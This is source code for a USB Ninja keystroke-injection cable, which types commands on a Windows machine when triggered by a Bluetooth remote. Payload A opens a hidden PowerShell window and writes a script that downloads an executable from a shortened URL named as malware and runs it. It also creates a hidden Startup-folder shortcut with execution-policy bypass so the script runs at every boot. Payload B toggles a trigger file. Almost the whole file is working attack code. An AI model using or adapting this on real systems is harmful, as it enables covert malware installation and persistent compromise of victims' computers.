// Written by G. Renault 21/04/23
// Payload A: 1. First trigger: Creates folder, creates script to detect if internet connection and download a malware and execute it at the following location $env:userprofile\\Desktop\\powershell_script\\malwar3.exe. Make this script a background task so that it runs at each startup.
//            2. Second trigger: Write A in trigger.txt file
//            3. Third trigger: Write reset in trigger.txt file
//            4. Go back to 2. and repeat ...
// Payload B: 1. First trigger: Write reset in trigger.txt file
//            2. Second trigger: Write B in trigger.txt file
// Thanks to the USB Ninja team

#define LAYOUT_FRENCH // Add this line before include.  Switch to French Keyboard layout.
#include <NinjaKeyboard.h>
#define const_1000 1000

/*https://www.usbninja.com/
This is the Code of Using Bluetooth remote control triggers Ninja to go
online, and act as a keyboard output characters.
*/

bool active_A = true;  // Is A payload active ?
bool active_B = false; // Is B payload active ?
bool init_a = true;    // Is A payload active for the first time ?

void setup()
{
  // pass
}

void loop() {}

/*
When the Bluetooth remote control button A is pressed.
The program in payloadA() will be executed in a loop.
Until the button A is released.
*/

void payloadA()
{
  USBninjaOnline(); // USBNinja appears.  The cable's data
                    // line was temporarily cut off.
  /*
  You should call NinjaKeyboard.begin() after you call
  NinjaKeyboard.end()
  Or, the NinjaKeyboard was disconnected and any action was not usable.
  */
  NinjaKeyboard.begin();           // Initliaze NinjaKeyboard USB Interface.
  NinjaKeyboard.delay(const_1000); // Delay 1 sec to compatibility Win7,
                                   // Some systems require 5 sec of preparation time.
  NinjaKeyboard.sendKeyStroke(0);  // Send HID '0' to compatibility Win7.
  NinjaKeyboard.delay(const_1000); // Delay 1 second to wait system.
                                   // Recognize the NinjaKeyboard.
  /*If you write a long string, you should use function F("") to include
  your string. Due to the Ninja`s RAM was only 512Byte, this function
  can write the string to Flash, and read it once a char to decrease
  the available memory.
  If you do not use this function, the string may load to RAM while
  the program start. The RAM use Bigger than 488Byte will cause
  runtime error.
  print() will write the string without Enter Key,
  println() will write the string with Enter Key.
  */
  NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Press two keys at the same time, "R" key and "win logo".
  // Call out the run window.
  NinjaKeyboard.delay(600);                                      // Delay 600mS.
  NinjaKeyboard.print(F("cmd /k powershell -w h -f .\\nf.ps1")); // Open a hidden terminal. This is done by using a bug: trying to open a powershell script that does not exist.
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);                        // Press enter
  NinjaKeyboard.delay(800);                                      // Delay 800mS.
  if (init_a == true)
  {
    NinjaKeyboard.println(F("cd %USERPROFILE%\\Desktop"));
    NinjaKeyboard.println(F("mkdir powershell_script"));
    NinjaKeyboard.println(F("cd powershell_script"));
    NinjaKeyboard.println(F("echo init>trigger.txt"));
    NinjaKeyboard.println(F(".>script.ps1 2>NUL"));
    // Need to update the link https://bit.ly/3Asrwhp with a correct link that points to a server storing the malware.exe file !
    NinjaKeyboard.println(F("echo|set/p=\"$url='https://bit.ly/3Asrwhp';$path=\"$env:userprofile\\Desktop\\powershell_script\\malwar3.exe\";while(-not(0-lt((Get-NetRoute|? DestinationPrefix -eq '0.0.0.0/0'|Get-NetIPInterface|Where ConnectionState -eq 'Connected')|measure -Line).Lines)){Start-Sleep -s 3}Invoke-WebRequest -Ur $url -O $path;Start-Sleep -s 20;Start-Process -f $path;\">>script.ps1"));
    NinjaKeyboard.println(F("echo Set oWS=WScript.CreateObject(\"WScript.Shell\")>VBs.vbs"));
    NinjaKeyboard.println(F("echo sHF=oWS.ExpandEnvironmentStrings(\"%USERPROFILE%\")>>VBs.vbs"));
    NinjaKeyboard.println(F("echo sLinkFile^=sHF ^& \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Hello.lnk\">>VBs.vbs"));
    NinjaKeyboard.println(F("echo Set oLink=oWS.CreateShortcut(sLinkFile)>>VBs.vbs"));
    NinjaKeyboard.println(F("echo tPath=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\">>VBs.vbs"));
    NinjaKeyboard.println(F("echo oLink.TargetPath=tPath>>VBs.vbs"));
    NinjaKeyboard.println(F("echo oLink.Arguments^=\"-w h -NoLogo -Ex ByPass -File \" ^& sHF ^& \"\\Desktop\\powershell_script\\script.ps1\">>VBs.vbs"));
    NinjaKeyboard.println(F("echo oLink.Save>>VBs.vbs"));
    NinjaKeyboard.println(F("cscript VBs.vbs"));
    NinjaKeyboard.println(F(".>%USERPROFILE%\\Desktop\\done.txt 2>NUL"));
    NinjaKeyboard.println(F("powershell -Ex Bypass -w h -f .\\script.ps1"));
    init_a = false;
  }
  else
  {
    NinjaKeyboard.println(F("cd %USERPROFILE%\\Desktop\\powershell_script"));
    if (active_A == false)
    {
      NinjaKeyboard.println(F("echo A>trigger.txt"));
      active_A = true;
    }
    else
    {
      NinjaKeyboard.println(F("echo reset>trigger.txt"));
      active_A = false;
    }
  }
  NinjaKeyboard.println(F("exit"));
  /*
  While your cable connect to Some Phone, Only switch USB DATA was
  not enough. The PC was still think that your phone was Ninja
  (Your Phone Not send USB ReEmulate command), it may cause
  non-stoppable input or NinjaKeyboard Device still Retain in your system.
  */
  NinjaKeyboard.end(); // Send Disconnect command to
                       // NinjaKeyboard USB Interface
  USBninjaOffline();     // USBNinja disappear. Cable Line back to normal.
  NinjaKeyboard.begin(); // ReStart Keyboard Interface while USB DATA
                         // was cut off. So you can use payloadB without
  // ReEmulate NinjaKeyboard.
}

/*
When the Bluetooth remote control button B is pressed.
The program in payloadB() will be executed in a loop.
Until the button B is released.
*/

void payloadB()
{
  USBninjaOnline();               // USBNinja appears.
                                  // The cable's data line was temporarily cut off.
  NinjaKeyboard.sendKeyStroke(0); // Send HID '0' to compatibility Win7.
  /*If you write a long string, you should use function F("") to include
  your string. Due to the Ninja`s RAM was only 512Byte, this function
  can write the string to Flash, and read it once a char to decrease
  the available memory.
  If you do not use this function, the string may load to RAM while
  the program start. The RAM use Bigger than 488Byte will cause
  runtime error.
  print() will write the string without Enter Key,
  println() will write the string with Enter Key.
  */
  NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Press two keys at the same time, "R" key and "win logo".
  // Call out the run window.
  NinjaKeyboard.delay(600);                                      // Delay 600mS.
  NinjaKeyboard.print(F("cmd /k powershell -w h -f .\\nf.ps1")); // Open a hideen terminal. This is done by using a bug: trying to open a powershell script that does not exist.
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);
  NinjaKeyboard.delay(800); // Delay 800mS.
  NinjaKeyboard.println(F("cd %USERPROFILE%\\Desktop\\powershell_script"));
  if (active_B == true)
  {
    NinjaKeyboard.println(F("echo reset>trigger.txt"));
    active_B = false;
  }
  else
  {
    NinjaKeyboard.println(F("echo B>trigger.txt"));
    active_B = true;
  }
  NinjaKeyboard.println(F("exit"));
}
